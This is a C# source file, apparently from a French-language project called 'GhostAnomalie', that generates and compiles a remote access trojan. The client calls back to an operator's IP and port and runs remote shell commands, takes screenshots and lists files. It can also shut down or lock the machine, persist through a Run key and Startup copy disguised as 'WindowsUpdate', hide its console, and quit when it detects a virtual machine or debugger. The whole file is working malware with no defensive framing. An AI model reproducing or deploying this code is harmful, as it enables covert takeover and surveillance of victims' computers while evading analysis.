using GhostAnomalie.Common.Utils;

namespace GhostAnomalie.Server.Utils
{
    public class CodeGenerator
    {
        public async Task<BuilderResult> Generate(
            string ip, int port, string password, string clientName, string fileName,
            bool persist, bool startup, bool hide, bool antiVM, bool antiDebug)
        {
            try
            {
                var code = GenerateCode(ip, port, password, clientName, persist, startup, hide, antiVM, antiDebug);

                var outputDir = Path.Combine(Directory.GetCurrentDirectory(), Constants.ClientsFolder);
                Directory.CreateDirectory(outputDir);

                var csFile = Path.Combine(outputDir, $"{fileName}.cs");
                await File.WriteAllTextAsync(csFile, code);

                // Compiler le code
                var exeFile = Path.Combine(outputDir, $"{fileName}.exe");
                var compileResult = await Compile(csFile, exeFile);

                if (compileResult)
                {
                    return new BuilderResult
                    {
                        Success = true,
                        FilePath = exeFile,
                        Error = null
                    };
                }

                return new BuilderResult
                {
                    Success = false,
                    FilePath = null,
                    Error = "Erreur de compilation. Assure-toi que .NET Framework 4.8 est installé."
                };
            }
            catch (Exception ex)
            {
                return new BuilderResult
                {
                    Success = false,
                    FilePath = null,
                    Error = ex.Message
                };
            }
        }

        private string GenerateCode(string ip, int port, string password, string clientName,
            bool persist, bool startup, bool hide, bool antiVM, bool antiDebug)
        {
            // On inclut tout le code dans le template
            var template = $@"
using System;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace {clientName}
{{
    public class Program
    {{
        private static TcpClient _client;
        private static NetworkStream _stream;
        private static bool _running = true;
        private static string _serverIp = ""{ip}"";
        private static int _serverPort = {port};
        private static string _password = ""{password}"";
        private static string _clientId = Environment.MachineName;

        public static async Task Main()
        {{
            Console.Title = ""System"";
            Console.WriteLine(""Ghost Anomalie Client v{Constants.Version}"");

            {(hide ? "HideConsole();" : "")}
            {(persist ? "AddPersistence();" : "")}
            {(startup ? "AddStartup();" : "")}
            {(antiVM ? "if (DetectVM()) return;" : "")}
            {(antiDebug ? "if (DetectDebugger()) return;" : "")}

            while (_running)
            {{
                try
                {{
                    await ConnectAndRun();
                }}
                catch
                {{
                    await Task.Delay(30000);
                }}
            }}
        }}

        private static async Task ConnectAndRun()
        {{
            _client = new TcpClient();
            await _client.ConnectAsync(_serverIp, _serverPort);
            _stream = _client.GetStream();

            // Authentification
            var authPacket = new {{ command = ""{password}"", clientId = _clientId }};
            var json = JsonSerializer.Serialize(authPacket);
            var bytes = Encoding.UTF8.GetBytes(json);
            await _stream.WriteAsync(bytes, 0, bytes.Length);

            // Attendre la réponse
            var buffer = new byte[8192];
            var read = await _stream.ReadAsync(buffer, 0, buffer.Length);
            var response = Encoding.UTF8.GetString(buffer, 0, read);

            // Boucle principale
            while (_running && _client.Connected)
            {{
                read = await _stream.ReadAsync(buffer, 0, buffer.Length);
                if (read == 0) break;

                var cmdJson = Encoding.UTF8.GetString(buffer, 0, read);
                try {{
                    var packet = JsonSerializer.Deserialize<CommandPacket>(cmdJson);
                    if (packet != null) {{
                        await ProcessCommand(packet);
                    }}
                }} catch {{ }}
            }}
        }}

        private static async Task ProcessCommand(dynamic packet)
        {{
            var result = new {{ CommandId = packet.Id, Success = false, Data = """", Error = """" }};

            try
            {{
                var command = packet.Command?.ToString()?.ToLower() ?? """";

                switch (command)
                {{
                    case ""screenshot"":
                        result.Data = TakeScreenshot();
                        result.Success = true;
                        break;

                    case ""sysinfo"":
                        result.Data = GetSystemInfo();
                        result.Success = true;
                        break;

                    case ""cmd"":
                        result.Data = ExecuteCommand(packet.Args?[0]?.ToString() ?? """");
                        result.Success = true;
                        break;

                    case ""ls"":
                        result.Data = ListFiles(packet.Args?[0]?.ToString() ?? ""."");
                        result.Success = true;
                        break;

                    case ""shutdown"":
                        Process.Start(""shutdown"", ""/s /t 0"");
                        result.Data = ""Arrêt en cours"";
                        result.Success = true;
                        break;

                    case ""restart"":
                        Process.Start(""shutdown"", ""/r /t 0"");
                        result.Data = ""Redémarrage en cours"";
                        result.Success = true;
                        break;

                    case ""lock"":
                        Process.Start(""rundll32.exe"", ""user32.dll,LockWorkStation"");
                        result.Data = ""Écran verrouillé"";
                        result.Success = true;
                        break;

                    case ""ping"":
                        result.Data = ""Pong!"";
                        result.Success = true;
                        break;

                    case ""exit"":
                        _running = false;
                        _client?.Close();
                        result.Data = ""Déconnexion"";
                        result.Success = true;
                        break;

                    default:
                        result.Error = $""Commande inconnue: {{command}}"";
                        break;
                }}
            }}
            catch (Exception ex)
            {{
                result.Error = ex.Message;
            }}

            var json = JsonSerializer.Serialize(result);
            var bytes = Encoding.UTF8.GetBytes(json);
            await _stream.WriteAsync(bytes, 0, bytes.Length);
        }}

        private static string TakeScreenshot()
        {{
            try
            {{
                using var bitmap = new System.Drawing.Bitmap(
                    System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width,
                    System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height
                );

                using var graphics = System.Drawing.Graphics.FromImage(bitmap);
                graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);

                using var ms = new MemoryStream();
                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                return Convert.ToBase64String(ms.ToArray());
            }}
            catch
            {{
                return ""Erreur: Impossible de capturer l'écran"";
            }}
        }}

        private static string GetSystemInfo()
        {{
            var sb = new StringBuilder();
            sb.AppendLine($""Machine: {{Environment.MachineName}}"");
            sb.AppendLine($""Utilisateur: {{Environment.UserName}}"");
            sb.AppendLine($""OS: {{Environment.OSVersion}}"");
            sb.AppendLine($"".NET: {{Environment.Version}}"");
            sb.AppendLine($""Processeurs: {{Environment.ProcessorCount}}"");
            return sb.ToString();
        }}

        private static string ExecuteCommand(string command)
        {{
            try
            {{
                var startInfo = new ProcessStartInfo
                {{
                    FileName = ""cmd.exe"",
                    Arguments = $""/c {{command}}"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }};

                using var process = Process.Start(startInfo);
                var output = process?.StandardOutput.ReadToEnd() ?? """";
                var error = process?.StandardError.ReadToEnd() ?? """";
                return string.IsNullOrEmpty(error) ? output : $""Erreur: {{error}}"";
            }}
            catch (Exception ex)
            {{
                return $""Erreur: {{ex.Message}}"";
            }}
        }}

        private static string ListFiles(string path)
        {{
            try
            {{
                var sb = new StringBuilder();
                var dir = new DirectoryInfo(path);

                foreach (var d in dir.GetDirectories())
                {{
                    sb.AppendLine($""📁 {{d.Name}}/"");
                }}

                foreach (var f in dir.GetFiles())
                {{
                    sb.AppendLine($""📄 {{f.Name}} ({{f.Length}} octets)"");
                }}

                return sb.ToString();
            }}
            catch (Exception ex)
            {{
                return $""Erreur: {{ex.Message}}"";
            }}
        }}

        {(persist ? $@"
        private static void AddPersistence()
        {{
            try
            {{
                var key = Registry.CurrentUser.CreateSubKey(""Software\\Microsoft\\Windows\\CurrentVersion\\Run"");
                key.SetValue(""WindowsUpdate"", System.Reflection.Assembly.GetExecutingAssembly().Location);
                key.Close();
            }}
            catch {{ }}
        }}" : "")}

        {(startup ? $@"
        private static void AddStartup()
        {{
            try
            {{
                var startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                var exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                File.Copy(exePath, Path.Combine(startupPath, ""WindowsUpdate.exe""), true);
            }}
            catch {{ }}
        }}" : "")}

        {(hide ? $@"
        [System.Runtime.InteropServices.DllImport(""user32.dll"")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [System.Runtime.InteropServices.DllImport(""kernel32.dll"")]
        private static extern IntPtr GetConsoleWindow();

        private static void HideConsole()
        {{
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
        }}" : "")}

        {(antiVM ? $@"
        private static bool DetectVM()
        {{
            try
            {{
                var vmProcesses = new[] {{ ""vmtoolsd.exe"", ""vboxservice.exe"", ""xenservice.exe"", ""vmware.exe"" }};
                foreach (var proc in Process.GetProcesses())
                {{
                    try
                    {{
                        foreach (var vm in vmProcesses)
                        {{
                            if (proc.ProcessName.ToLower().Contains(vm.Replace("".exe"", """")))
                                return true;
                        }}
                    }}
                    catch {{ }}
                }}
            }}
            catch {{ }}
            return false;
        }}" : "")}

        {(antiDebug ? $@"
        private static bool DetectDebugger()
        {{
            try
            {{
                if (Debugger.IsAttached) return true;
                if (Debugger.IsLogging()) return true;
            }}
            catch {{ }}
            return false;
        }}" : "")}
    }}

    public class CommandPacket
    {{
        public string Id {{ get; set; }} = Guid.NewGuid().ToString();
        public string Command {{ get; set; }} = """";
        public string[]? Args {{ get; set; }}
        public string? ClientId {{ get; set; }}
    }}
}}
";

            return template;
        }

        private async Task<bool> Compile(string csFile, string exeFile)
        {
            try
            {
                // Essayer avec dotnet
                var startInfo = new ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = $"build \"{csFile}\" -c Release -o \"{Path.GetDirectoryName(exeFile)}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = Process.Start(startInfo);
                if (process != null)
                {
                    await process.WaitForExitAsync();

                    if (File.Exists(exeFile))
                        return true;
                }

                // Fallback: utiliser csc.exe (compilateur .NET Framework)
                var cscPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    "Microsoft.NET", "Framework", "v4.0.30319", "csc.exe"
                );

                if (File.Exists(cscPath))
                {
                    var args = $"/target:winexe /out:\"{exeFile}\" \"{csFile}\"";
                    var process2 = Process.Start(cscPath, args);
                    if (process2 != null)
                    {
                        await process2.WaitForExitAsync();

                        if (File.Exists(exeFile))
                            return true;
                    }
                }

                return false;
            }
            catch
            {
                return false;
            }
        }
    }

    public class BuilderResult
    {
        public bool Success { get; set; }
        public string? FilePath { get; set; }
        public string? Error { get; set; }
    }
}
